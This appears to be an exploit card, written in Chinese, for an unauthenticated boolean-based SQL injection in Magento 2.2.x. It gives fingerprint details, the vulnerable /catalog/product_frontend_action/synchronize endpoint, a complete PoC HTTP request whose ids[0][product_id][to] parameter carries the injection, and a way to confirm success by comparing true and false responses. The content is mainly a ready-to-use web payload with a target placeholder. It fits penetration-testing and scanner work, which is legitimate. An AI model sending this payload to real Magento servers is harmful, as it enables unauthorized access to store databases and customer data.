# Magento SQL Injection (2.2-sqli)

## 指纹特征
- 服务: Magento 2.2.x
- 端口: 8080 (默认)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| SQL 注入 (Boolean-based) | `/catalog/product_frontend_action/synchronize` | 无 |

## PoC 指令

通过构造包含 `OR` 条件的 `ids` 参数实现 SQL 盲注：

```http
GET /catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+- HTTP/1.1
Host: {{TARGET}}:8080
```

## Success Signal
- **状态验证**: 发送 `WHERE 1=1` 和 `WHERE 1=0` 请求，服务器返回不同的 HTTP 状态码或响应内容，从而确认 SQL 注入成功。
| 关键参数 | 说明 |
| :--- | :--- |
| `ids[0][product_id][to]` | 存在未过滤的 SQL 拼接点 |
